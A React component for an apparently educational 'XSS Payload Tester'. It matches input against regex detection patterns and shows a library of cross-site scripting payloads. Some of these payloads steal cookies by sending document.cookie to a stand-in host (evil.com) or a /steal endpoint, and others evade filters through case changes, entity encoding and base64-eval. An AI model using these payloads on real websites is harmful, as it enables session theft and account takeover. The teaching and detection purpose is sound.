import React, { useState } from 'react';
import { Code, Play, AlertTriangle, CheckCircle, Copy, RotateCcw, Info } from 'lucide-react';

const XSSPayloadTester = ({ onClose }) => {
  const [payload, setPayload] = useState('');
  const [testResult, setTestResult] = useState(null);
  const [selectedPayload, setSelectedPayload] = useState('');
  const [testMode, setTestMode] = useState('reflected');

  const commonPayloads = {
    basic: [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      '<svg onload=alert("XSS")>',
      'javascript:alert("XSS")',
      '<iframe src="javascript:alert(\'XSS\')"></iframe>'
    ],
    advanced: [
      '<script>document.cookie="stolen="+document.cookie</script>',
      '<img src=x onerror=fetch("/steal?cookie="+document.cookie)>',
      '<script>window.location="http://evil.com?cookie="+document.cookie</script>',
      '<svg/onload=eval(atob("YWxlcnQoIlhTUyIp"))>',
      '<script>new Image().src="http://evil.com/log?"+document.cookie</script>'
    ],
    bypass: [
      '<ScRiPt>alert("XSS")</ScRiPt>',
      '<script>ale\\u0072t("XSS")</script>',
      '<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">',
      '<svg><script>alert("XSS")</script></svg>',
      '<iframe srcdoc="<script>alert(\'XSS\')</script>"></iframe>'
    ]
  };

  const testPayload = () => {
    if (!payload.trim()) {
      setTestResult({ type: 'error', message: 'Please enter a payload to test' });
      return;
    }

    // Simulate XSS testing (safe environment)
    const dangerousPatterns = [
      /<script[^>]*>.*?<\/script>/gi,
      /javascript:/gi,
      /on\w+\s*=/gi,
      /<iframe[^>]*>/gi,
      /<object[^>]*>/gi,
      /<embed[^>]*>/gi,
      /eval\s*\(/gi,
      /document\.cookie/gi
    ];

    const detectedPatterns = [];
    dangerousPatterns.forEach((pattern, index) => {
      if (pattern.test(payload)) {
        const patternNames = [
          'Script tags',
          'JavaScript protocol',
          'Event handlers',
          'Iframe injection',
          'Object embedding',
          'Embed tags',
          'Eval function',
          'Cookie access'
        ];
        detectedPatterns.push(patternNames[index]);
      }
    });

    if (detectedPatterns.length > 0) {
      setTestResult({
        type: 'danger',
        message: `⚠️ XSS payload detected! Found: ${detectedPatterns.join(', ')}`,
        patterns: detectedPatterns,
        severity: detectedPatterns.length > 2 ? 'High' : detectedPatterns.length > 1 ? 'Medium' : 'Low'
      });
    } else {
      setTestResult({
        type: 'safe',
        message: '✅ No obvious XSS patterns detected in this payload',
        severity: 'Safe'
      });
    }
  };

  const encodePayload = (payload, type) => {
    switch (type) {
      case 'html':
        return payload
          .replace(/&/g, '&amp;')
          .replace(/</g, '&lt;')
          .replace(/>/g, '&gt;')
          .replace(/"/g, '&quot;')
          .replace(/'/g, '&#x27;');
      case 'url':
        return encodeURIComponent(payload);
      case 'base64':
        return btoa(payload);
      default:
        return payload;
    }
  };

  const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text);
  };

  return (
    <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50 p-4">
      <div className="htb-card rounded-lg max-w-4xl w-full max-h-[90vh] overflow-y-auto">
        <div className="p-6">
          {/* Header */}
          <div className="flex items-center justify-between mb-6">
            <div className="flex items-center space-x-3">
              <Code className="h-8 w-8 text-htb-green" />
              <div>
                <h2 className="text-2xl font-bold text-htb-gray-light">XSS Payload Tester</h2>
                <p className="text-htb-gray">Test Cross-Site Scripting payloads in a safe environment</p>
              </div>
            </div>
            <button
              onClick={onClose}
              className="text-htb-gray hover:text-htb-red transition-colors"
            >
              ✕
            </button>
          </div>

          {/* Test Mode Selection */}
          <div className="mb-6">
            <label className="block text-sm font-medium text-htb-gray-light mb-2">
              XSS Test Mode
            </label>
            <div className="flex space-x-4">
              {['reflected', 'stored', 'dom'].map(mode => (
                <button
                  key={mode}
                  onClick={() => setTestMode(mode)}
                  className={`px-4 py-2 rounded-lg text-sm font-medium transition-colors ${
                    testMode === mode
                      ? 'bg-htb-green text-htb-dark'
                      : 'bg-htb-dark-light text-htb-gray hover:bg-htb-gray/10'
                  }`}
                >
                  {mode.charAt(0).toUpperCase() + mode.slice(1)} XSS
                </button>
              ))}
            </div>
          </div>

          <div className="grid lg:grid-cols-2 gap-6">
            {/* Left Column - Payload Input */}
            <div className="space-y-4">
              <div>
                <label className="block text-sm font-medium text-htb-gray-light mb-2">
                  XSS Payload
                </label>
                <textarea
                  value={payload}
                  onChange={(e) => setPayload(e.target.value)}
                  placeholder="Enter your XSS payload here..."
                  className="htb-input w-full h-32 p-3 rounded-lg font-mono text-sm"
                />
              </div>

              <div className="flex space-x-2">
                <button
                  onClick={testPayload}
                  className="htb-btn-primary px-4 py-2 rounded-lg flex items-center space-x-2"
                >
                  <Play className="h-4 w-4" />
                  <span>Test Payload</span>
                </button>
                <button
                  onClick={() => {
                    setPayload('');
                    setTestResult(null);
                  }}
                  className="htb-btn-secondary px-4 py-2 rounded-lg flex items-center space-x-2"
                >
                  <RotateCcw className="h-4 w-4" />
                  <span>Clear</span>
                </button>
              </div>

              {/* Test Result */}
              {testResult && (
                <div className={`p-4 rounded-lg border ${
                  testResult.type === 'danger' 
                    ? 'bg-htb-red/10 border-htb-red/30 text-htb-red'
                    : testResult.type === 'safe'
                    ? 'bg-htb-green/10 border-htb-green/30 text-htb-green'
                    : 'bg-htb-yellow/10 border-htb-yellow/30 text-htb-yellow'
                }`}>
                  <div className="flex items-start space-x-2">
                    {testResult.type === 'danger' ? (
                      <AlertTriangle className="h-5 w-5 mt-0.5" />
                    ) : (
                      <CheckCircle className="h-5 w-5 mt-0.5" />
                    )}
                    <div className="flex-1">
                      <p className="font-medium">{testResult.message}</p>
                      {testResult.patterns && (
                        <div className="mt-2">
                          <p className="text-sm opacity-90">Severity: {testResult.severity}</p>
                          <p className="text-sm opacity-90">Detected patterns: {testResult.patterns.length}</p>
                        </div>
                      )}
                    </div>
                  </div>
                </div>
              )}

              {/* Encoding Options */}
              <div>
                <h3 className="text-lg font-semibold text-htb-gray-light mb-3">Payload Encoding</h3>
                <div className="space-y-2">
                  {['html', 'url', 'base64'].map(encoding => (
                    <div key={encoding} className="flex items-center space-x-2">
                      <span className="text-sm text-htb-gray w-16">{encoding.toUpperCase()}:</span>
                      <code className="flex-1 bg-htb-dark-light p-2 rounded text-xs text-htb-gray-light font-mono break-all">
                        {payload ? encodePayload(payload, encoding) : 'Enter payload to see encoding'}
                      </code>
                      <button
                        onClick={() => copyToClipboard(encodePayload(payload, encoding))}
                        className="text-htb-green hover:text-htb-green-light"
                        disabled={!payload}
                      >
                        <Copy className="h-4 w-4" />
                      </button>
                    </div>
                  ))}
                </div>
              </div>
            </div>

            {/* Right Column - Payload Library */}
            <div className="space-y-4">
              <h3 className="text-lg font-semibold text-htb-gray-light">Payload Library</h3>
              
              {Object.entries(commonPayloads).map(([category, payloads]) => (
                <div key={category} className="space-y-2">
                  <h4 className="text-sm font-medium text-htb-green capitalize">{category} Payloads</h4>
                  <div className="space-y-1">
                    {payloads.map((p, index) => (
                      <div
                        key={index}
                        className="bg-htb-dark-light p-2 rounded cursor-pointer hover:bg-htb-gray/10 transition-colors group"
                        onClick={() => setPayload(p)}
                      >
                        <code className="text-xs text-htb-gray-light font-mono break-all">
                          {p}
                        </code>
                        <button
                          onClick={(e) => {
                            e.stopPropagation();
                            copyToClipboard(p);
                          }}
                          className="ml-2 opacity-0 group-hover:opacity-100 text-htb-green hover:text-htb-green-light transition-opacity"
                        >
                          <Copy className="h-3 w-3" />
                        </button>
                      </div>
                    ))}
                  </div>
                </div>
              ))}

              {/* Educational Info */}
              <div className="bg-htb-blue/10 border border-htb-blue/30 p-4 rounded-lg">
                <div className="flex items-start space-x-2">
                  <Info className="h-5 w-5 text-htb-blue mt-0.5" />
                  <div className="text-sm text-htb-blue">
                    <p className="font-medium mb-1">Educational Purpose Only</p>
                    <p className="text-xs opacity-90">
                      This tool is for learning XSS concepts safely. Never use these payloads on websites you don't own or without explicit permission.
                    </p>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default XSSPayloadTester;